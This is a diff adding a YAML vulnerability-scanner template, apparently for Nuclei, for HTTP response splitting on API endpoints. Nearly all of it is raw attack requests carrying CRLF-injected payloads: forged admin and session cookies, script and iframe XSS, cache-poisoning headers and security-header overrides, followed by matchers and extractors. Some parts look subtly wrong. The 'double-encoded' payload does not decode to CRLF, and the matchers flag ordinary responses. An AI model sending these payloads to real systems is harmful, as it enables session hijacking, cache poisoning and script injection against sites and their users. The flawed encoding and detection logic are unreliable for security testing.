@@ -1,0 +1,163 @@
+id: api-response-manipulation-injection
+
+info:
+  name: API Response Manipulation - HTTP Response Splitting Attack
+  author: elite-red-team
+  severity: high
+  description: |
+    Advanced HTTP Response Splitting and Response Manipulation attack template.
+    Exploits improper input validation in API responses to inject malicious
+    headers, perform cache poisoning, session fixation, and XSS attacks.
+  reference:
+    - https://owasp.org/www-community/attacks/HTTP_Response_Splitting
+    - https://portswigger.net/kb/issues/00200200_http-response-header-injection
+    - https://cwe.mitre.org/data/definitions/113.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
+    cvss-score: 8.7
+    cwe-id: CWE-113
+  tags: api,response-splitting,header-injection,xss,cache-poisoning,red-team
+
+http:
+  - raw:
+      # Test 1: Basic HTTP Response Splitting with CRLF injection
+      - |
+        GET /api/redirect?url=https://example.com%0d%0aSet-Cookie:%20admin=true HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (compatible; ResponseSplitter/1.0)
+        Accept: application/json
+        
+      # Test 2: Response splitting with XSS payload injection
+      - |
+        GET /api/search?q=test%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert('Response Splitting XSS')</script> HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml
+        
+      # Test 3: Response manipulation via callback parameter
+      - |
+        GET /api/jsonp?callback=alert(1)%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(document.domain)</script> HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/javascript
+        
+      # Test 4: Response splitting with session fixation
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 89
+        
+        username=admin&password=test%0d%0aSet-Cookie:%20JSESSIONID=FIXED_SESSION_ID;%20Path=/
+        
+      # Test 5: Response manipulation with cache control bypass
+      - |
+        GET /api/user/profile?user_id=123%0d%0aCache-Control:%20public,%20max-age=31536000%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<h1>Cached Malicious Content</h1> HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        
+      # Test 6: Double URL encoding response splitting
+      - |
+        GET /api/redirect?next=%252d%250a%252d%250aSet-Cookie:%2520admin=true%252d%250aContent-Type:%2520text/html%252d%250a%252d%250a<script>alert('Double Encoded')</script> HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        
+      # Test 7: Response splitting with Location header manipulation
+      - |
+        GET /api/oauth/callback?state=valid%0d%0aLocation:%20javascript:alert('Response Manipulation')%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        
+      # Test 8: Response manipulation with custom headers
+      - |
+        POST /api/contact HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Content-Length: 156
+        
+        {"name":"test%0d%0aX-XSS-Protection:%200%0d%0aContent-Security-Policy:%20none%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert('CSP Bypass')</script>","email":"test@test.com"}
+        
+      # Test 9: Response splitting with UTF-8 encoding
+      - |
+        GET /api/search?term=test%E5%98%8A%E5%98%8DSet-Cookie:%20admin=true%E5%98%8A%E5%98%8DContent-Type:%20text/html%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D<script>alert('UTF-8 Response Splitting')</script> HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        
+      # Test 10: Response manipulation with HTTP/2 downgrade
+      - |
+        GET /api/data?param=value%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aX-Frame-Options:%20ALLOWALL%0d%0a%0d%0a<iframe src="javascript:alert('Frame Injection')"></iframe> HTTP/1.1
+        Host: {{Hostname}}
+        Connection: Upgrade, HTTP2-Settings
+        Upgrade: h2c
+        Accept: application/json
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 302
+          - 307
+          - 308
+          
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie:"
+          - "Location:"
+          - "Content-Type: text/html"
+          - "X-XSS-Protection: 0"
+          - "Content-Security-Policy: none"
+          - "X-Frame-Options: ALLOWALL"
+          - "Cache-Control: public"
+        condition: or
+        
+      - type: word
+        part: body
+        words:
+          - "<script>"
+          - "alert("
+          - "javascript:"
+          - "<iframe"
+          - "onerror="
+          - "onload="
+          - "document.domain"
+          - "document.cookie"
+          - "eval("
+          - "setTimeout("
+        condition: or
+        
+      - type: regex
+        part: response
+        regex:
+          - '(?i)set-cookie:\s*[^=]+=[^;\r\n]*'
+          - '(?i)location:\s*javascript:[^\r\n]*'
+          - '(?i)content-type:\s*text/html[^\r\n]*'
+          - '(?i)<script[^>]*>.*?</script>'
+          - '(?i)<iframe[^>]*src\s*=\s*["\']javascript:[^"\']*["\'][^>]*>'
+          - '(?i)on\w+\s*=\s*["\'][^"\']*["\']'
+        condition: or
+
+    extractors:
+      - type: regex
+        name: injected_headers
+        part: header
+        regex:
+          - '(?i)(Set-Cookie|Location|Content-Type|X-XSS-Protection|Content-Security-Policy|X-Frame-Options):\s*([^\r\n]+)'
+          
+      - type: regex
+        name: injected_content
+        part: body
+        regex:
+          - '<script[^>]*>([^<]*)</script>'
+          - '<iframe[^>]*src\s*=\s*["\']([^"\']*)["\'][^>]*>'
+          - 'javascript:([^"\s\r\n]*)'
+          - 'alert\(([^)]*)\)'
+          
+      - type: kval
+        part: header
+        kval:
+          - Set-Cookie
+          - Location
+          - Content-Type
+          - X-XSS-Protection
+          - Content-Security-Policy
